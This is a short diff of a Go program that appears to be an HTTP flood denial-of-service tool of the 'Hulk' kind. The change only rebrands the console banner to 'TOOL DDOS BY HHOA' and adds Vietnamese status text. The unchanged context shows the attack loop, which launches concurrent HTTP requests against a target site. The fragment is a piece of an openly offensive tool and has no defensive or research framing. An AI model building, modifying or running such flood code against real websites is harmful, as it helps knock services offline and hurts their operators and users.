@@ -13158,12 +13158,12 @@ func main() {
 	}
 
 	go func() {
-		fmt.Println("-- Attack Website --\n           Hulk4\n\n")
+		fmt.Println("-- TOOL DDOS BY HHOA --\n           Hakito\n\n")
 		ss := make(chan uint8, 8)
 		var (
 			err, sent int32
 		)
-		fmt.Println("Send Attack               |\t Done |\tErol")
+		fmt.Println("Send Attack               |\t Bắt Đầu Chạy |\tErol")
 		for {
 			if atomic.LoadInt32(&cur) < int32(maxproc-1) {
 				go httpcall(site, u.Host, data, headers, ss)
